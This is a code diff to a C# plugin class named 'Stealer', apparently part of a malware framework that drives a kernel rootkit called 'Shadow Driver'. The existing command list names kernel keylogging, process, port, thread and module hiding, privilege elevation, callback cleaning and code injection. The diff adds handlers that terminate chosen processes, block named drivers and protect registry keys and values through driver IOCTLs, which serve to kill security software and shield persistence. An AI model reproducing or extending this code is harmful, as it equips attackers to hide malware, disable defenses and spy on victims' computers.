@@ -126,7 +126,7 @@ public sealed class Stealer : IUniversalPlugin
     get => new string[] { 
         "collect", "kernel_hide", "kernel_elevate", "kernel_protect", "kernel_keylog", "kernel_blind",
         "kernel_hide_port", "kernel_clean_callbacks", "kernel_ghost_reg", "kernel_inject_apc", "kernel_inject_hijack",
-        "kernel_hide_thread", "kernel_hide_module"
+        "kernel_hide_thread", "kernel_hide_module", "kernel_terminate", "kernel_block_driver", "kernel_protect_reg_key", "kernel_protect_reg_val"
     };
   }
 
@@ -325,6 +325,78 @@ public sealed class Stealer : IUniversalPlugin
                 output = success ? $"Module {m[1]} ghosted in PID {m[0]}." : "Failed to ghost module.";
               }
               else { output = "Invalid parameters. Use: pid|moduleName"; success = false; }
+            }
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
+          }
+          return new PluginResult() { Success = success, Message = output };
+
+        case "kernel_terminate":
+          using (var dev = new KernelController())
+          {
+            if (dev.Connect())
+            {
+              int targetPid = parameters != null ? Convert.ToInt32(parameters) : 0;
+              if (targetPid > 0)
+              {
+                var target = new KernelController.TargetProcess { Pid = (IntPtr)targetPid };
+                success = dev.SendIoctl(KernelController.TERMINATE_PROCESS, ref target);
+                output = success ? $"Process {targetPid} terminated via Kernel." : "Failed to terminate process.";
+              }
+              else { output = "Invalid PID."; success = false; }
+            }
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
+          }
+          return new PluginResult() { Success = success, Message = output };
+
+        case "kernel_block_driver":
+          using (var dev = new KernelController())
+          {
+            if (dev.Connect())
+            {
+              string driverName = parameters as string;
+              if (!string.IsNullOrEmpty(driverName))
+              {
+                var target = new KernelController.TargetDriver { Name = driverName, Enable = true };
+                success = dev.SendIoctl(KernelController.BLOCK_DRIVER, ref target);
+                output = success ? $"Driver {driverName} blocked." : "Failed to block driver.";
+              }
+              else { output = "Invalid driver name."; success = false; }
+            }
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
+          }
+          return new PluginResult() { Success = success, Message = output };
+
+        case "kernel_protect_reg_key":
+          using (var dev = new KernelController())
+          {
+            if (dev.Connect())
+            {
+              string keyPath = parameters as string;
+              if (!string.IsNullOrEmpty(keyPath))
+              {
+                var target = new KernelController.TargetRegistry { Key = keyPath, Enable = true };
+                success = dev.SendIoctl(KernelController.REGISTRY_PROTECTION_KEY, ref target);
+                output = success ? "Registry key protected." : "Failed to protect registry key.";
+              }
+              else { output = "Invalid key path."; success = false; }
+            }
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
+          }
+          return new PluginResult() { Success = success, Message = output };
+
+        case "kernel_protect_reg_val":
+          using (var dev = new KernelController())
+          {
+            if (dev.Connect())
+            {
+              string[] rv = (parameters as string)?.Split('|');
+              if (rv?.Length >= 2)
+              {
+                var target = new KernelController.TargetRegistry { Key = rv[0], Value = rv[1], Enable = true };
+                success = dev.SendIoctl(KernelController.REGISTRY_PROTECTION_VALUE, ref target);
+                output = success ? "Registry value protected." : "Failed to protect registry value.";
+              }
+              else { output = "Invalid parameters. Use: key|value"; success = false; }
             }
             else { output = "Failed to connect to Shadow Driver."; success = false; }
           }
